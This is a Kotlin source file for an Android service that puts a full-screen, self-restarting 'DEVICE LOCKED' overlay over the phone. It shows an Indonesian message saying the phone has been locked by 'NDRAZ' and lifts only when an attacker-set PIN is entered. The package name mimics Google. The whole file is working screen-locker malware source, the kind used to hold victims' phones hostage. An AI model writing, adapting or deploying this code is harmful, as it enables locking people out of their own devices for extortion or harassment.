package com.google.appmods

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.WindowManager
import android.widget.LinearLayout
import android.widget.TextView

class LockService : Service() {
    private var view: LinearLayout? = null
    private var expectedPin = "123456"
    private var inputPin = ""
    private lateinit var pinDots: TextView

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        expectedPin = intent?.getStringExtra("pin") ?: "123456"
        val msg = intent?.getStringExtra("message") ?: "HP ANDA TELAH TERKUNCI BY NDRAZ"
        
        if (view == null) {
            showOverlay(msg)
        }
        return START_STICKY
    }

    private fun showOverlay(message: String) {
        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.setBackgroundColor(Color.parseColor("#0a0a0f"))
        layout.gravity = Gravity.CENTER

        val title = TextView(this)
        title.text = "DEVICE LOCKED"
        title.setTextColor(Color.WHITE)
        title.textSize = 24f
        title.gravity = Gravity.CENTER
        layout.addView(title)

        val sub = TextView(this)
        sub.text = message
        sub.setTextColor(Color.parseColor("#ff4fc2"))
        sub.textSize = 14f
        sub.gravity = Gravity.CENTER
        sub.setPadding(0, 20, 0, 40)
        layout.addView(sub)

        pinDots = TextView(this)
        pinDots.text = "____"
        pinDots.setTextColor(Color.WHITE)
        pinDots.textSize = 30f
        pinDots.gravity = Gravity.CENTER
        pinDots.letterSpacing = 0.5f
        layout.addView(pinDots)

        val grid = LinearLayout(this)
        grid.orientation = LinearLayout.VERTICAL
        grid.gravity = Gravity.CENTER
        grid.setPadding(0, 40, 0, 0)

        val numbers = arrayOf("1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "⌫")
        var row: LinearLayout? = null

        for (i in numbers.indices) {
            if (i % 3 == 0) {
                row = LinearLayout(this)
                row.orientation = LinearLayout.HORIZONTAL
                row.gravity = Gravity.CENTER
                grid.addView(row)
            }

            val btn = TextView(this)
            btn.text = numbers[i]
            btn.setTextColor(Color.WHITE)
            btn.textSize = 24f
            btn.gravity = Gravity.CENTER
            
            val size = 160
            val params = LinearLayout.LayoutParams(size, size)
            params.setMargins(15, 15, 15, 15)
            btn.layoutParams = params

            val bg = GradientDrawable()
            bg.shape = GradientDrawable.OVAL
            bg.setColor(Color.parseColor("#1a0424"))
            bg.setStroke(2, Color.parseColor("#ff4fc2"))
            btn.background = bg

            btn.setOnClickListener {
                if (numbers[i] == "⌫") {
                    if (inputPin.isNotEmpty()) {
                        inputPin = inputPin.dropLast(1)
                    }
                } else if (numbers[i] != "") {
                    if (inputPin.length < expectedPin.length) {
                        inputPin += numbers[i]
                    }
                }
                
                pinDots.text = inputPin.padEnd(expectedPin.length, '_')
                
                if (inputPin == expectedPin) {
                    stopSelf()
                }
            }
            row?.addView(btn)
        }

        layout.addView(grid)
        
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
        }
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or 
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT
        )
        
        params.gravity = Gravity.TOP or Gravity.LEFT
        view = layout
        wm.addView(layout, params)
    }

    override fun onDestroy() {
        try {
            val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            view?.let { wm.removeView(it) }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        super.onDestroy()
    }

    companion object {
        fun start(ctx: Context, pin: String, msg: String) {
            val intent = Intent(ctx, LockService::class.java)
            intent.putExtra("pin", pin)
            intent.putExtra("message", msg)
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent)
            } else {
                ctx.startService(intent)
            }
        }
        
        fun stop(ctx: Context) {
            ctx.stopService(Intent(ctx, LockService::class.java))
        }
    }
}
